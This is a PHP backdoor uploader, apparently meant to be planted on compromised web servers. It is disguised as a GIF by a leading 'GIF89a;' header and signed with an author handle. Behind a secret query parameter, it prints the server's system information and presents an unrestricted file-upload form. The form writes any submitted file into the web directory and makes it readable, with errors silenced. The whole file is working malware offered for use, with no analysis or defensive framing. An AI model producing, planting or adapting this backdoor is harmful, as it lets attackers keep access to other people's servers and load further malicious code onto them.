GIF89a;

<html>
<!-- Priv8 Uploader by twitter.com/InocentH4x0r -->
<style>
body{
text-align:center;
color: gray; 
background-color:black; 
font-family: Georgia;
}
</style>
</html>
<?php
error_reporting(0);
set_time_limit(0);

if($_GET['s4t4n']=="true"){
echo "<br><b>#</b> uname -a<br>".php_uname()."<br><br></b>"; 
echo '<font color="black" size="4">';
if(isset($_POST['Submit'])){
    $filedir = ""; 
    $maxfile = '2000000';
    $mode = '0644';
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if(isset($_FILES['image']['name'])) {
        $qx = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $qx);
        @chmod ($qx, octdec($mode));
echo" <a href=$userfile_name><b>Uploaded Sucessfully ==> $userfile_name</b></a>";
}
}
else{
echo'<font size=19px color=red>Inocent Priv8 Backdoor Uploader x)</font><br><font color=gray><br><form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
}
echo '</font>';
}
?>
